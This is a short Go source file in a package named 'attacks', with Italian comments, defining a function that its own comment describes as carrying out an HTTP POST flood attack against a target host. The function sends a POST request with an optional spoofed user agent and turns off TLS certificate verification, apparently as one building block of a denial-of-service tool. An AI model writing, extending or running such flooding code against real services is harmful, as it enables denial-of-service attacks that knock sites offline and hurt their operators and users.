package attacks

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"strings"
	"time"
)

// SendHTTPPost esegue un attacco HTTP POST flood contro un host
func SendHTTPPost(target, body, userAgent string) error {
	// Aggiungiamo il prefisso "http://" se manca
	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		target = "http://" + target
	}

	// Configura un client HTTP che ignora la validazione del certificato SSL/TLS
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	req, err := http.NewRequest("POST", target, strings.NewReader(body))
	if err != nil {
		return fmt.Errorf("failed to create HTTP POST request: %v", err)
	}

	// Imposta l'User-Agent se specificato
	if userAgent != "" {
		req.Header.Set("User-Agent", userAgent)
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("HTTP POST request failed: %v", err)
	}
	defer resp.Body.Close()

	// Restituisce nil se tutto è andato a buon fine
	return nil
}
